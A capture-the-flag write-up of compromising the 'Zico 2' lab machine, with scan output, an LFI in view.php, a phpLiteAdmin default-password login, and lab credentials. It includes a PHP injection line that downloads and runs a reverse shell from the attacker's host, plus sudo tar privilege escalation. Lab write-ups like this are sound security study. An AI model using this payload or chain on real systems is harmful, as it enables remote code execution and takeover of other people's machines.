# Zico 2
### Users
```
zico
```
### Credentials
```
zico:zico2215@
root:34kroot34

DB Password - Wordpress
zico:sWfCsfJSPV9H3AmQzw8

SSH Creds
zico:sWfCsfJSPV9H3AmQzw8
```
## Nmap Scan
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Zico's Shop
|_http-server-header: Apache/2.2.22 (Ubuntu)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41708/udp   status
|   100024  1          43168/tcp   status
|   100024  1          44868/udp6  status
|_  100024  1          59995/tcp6  status
43168/tcp open  status  1 (RPC #100024)
```
## Enumeration
### Web Services
__/view.php?page=../../../../../../../etc/passwd__
* Vulnerable to LFI
* Able to read /etc/passwd
```
## FUZZING ##
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.48/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 1ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 1ms]
img                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 0ms]
tools                   [Status: 200, Size: 8355, Words: 3291, Lines: 186, Duration: 0ms]
index                   [Status: 200, Size: 7970, Words: 2382, Lines: 184, Duration: 1ms]
view                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
dbadmin                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1ms]
vendor                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 1ms]
package                 [Status: 200, Size: 789, Words: 112, Lines: 30, Duration: 1ms]
server-status           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 0ms]
```
__/dbadmin/test_db.php__
* Exposed a phpLiteAdmin v1.9.3 database using a default password of "admin"
* Inside I found an info database with user zico and root hashes
### Machine Enumeration
```
## ARCHITECTURE ##
/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked (uses shared libs), for GNU/Linux 2.6.24,
BuildID[sha1]=0x22aaca9f1cf671f1833596d2d3a06c99176d9d33, stripped

## KERNEL ##
Linux zico 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012
x86_64 x86_64 x86_64 GNU/Linux

## RELEASE ##
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04.5 LTS"
NAME="Ubuntu"
VERSION="12.04.5 LTS, Precise Pangolin"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu precise (12.04.5 LTS)"
VERSION_ID="12.04"

======================================================================================

## zico USER ##

#! sudo -l !#
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip

#! SUID !#
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/sudoedit
/usr/bin/at
/sbin/mount.nfs
/bin/fusermount
/bin/umount
/bin/ping6
/bin/su
/bin/mount
/bin/ping

#! GUID !#
/usr/sbin/uuidd
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/mlocate
/usr/bin/mail-touchlock
/usr/bin/dotlockfile
/usr/bin/wall
/usr/bin/ssh-agent
/usr/bin/mail-lock
/usr/bin/mail-unlock
/usr/bin/expiry
/usr/bin/chage
/usr/bin/at
/sbin/unix_chkpwd
```
## Gaining a Foothold / Privilege Escalation
First glance on the port 80, and I found and LFI vulnerability which I used to read /etc/passwd and enumerate the user “zico”. 

Since I could not find anything else by manual enumeration, I started ffuf scanning with raft-medium-directories list and found a “dbadmin” directory which contained test_db.php file. When opening it it is a phpLiteAdmin database interface, and using default password “admin” I can log in.

Using this interface I was able to exploit a PHP Remote Code Execution vulnerability in the software and get a reverse shell. I had done this by creating a database named “hack” with a default value of:
```
<?php system("wget 192.168.1.253:8000/php-reverse-shell.php -O /tmp/reverse-shell.php; php /tmp/reverse-shell.php"); ?>
```
* *This command will connect to our machine’s python server download the reverse shell file and execute it in the machine connecting to our listener.*
Now to access this I can leverage the LFI vulnerability since in the dashboard there is a file path where my database is stored. So when navigating to ../../../../../usr/databases/hack (note there is no extension) the php code will execute and there will be a shell on our listener for the www-data user.

Looking through the machine I found a wordpress directory in the user “zico” home directory. In the wp-config.php we can see credentials for the MySQL database. trying to access it we get permission denied, but when trying to SSH with the same credentials we are successfull since use “zico” reused his credentials.

As a real user i decided to run “sudo -l” and got back two binaries I could run with sudo even without password; /bin/tar and /usr/sbin/zip. Going on GTFObins and searching you can find ways for both these binaries, I went with the tar way. Executing a one liner from GTFObins I successfully got root user shell and root level permissions on the machine.
### Journal
* When I was creating a database at first I would create a database whose name would end in a .php extension and it would not work only when I removed the .php from the name it executed
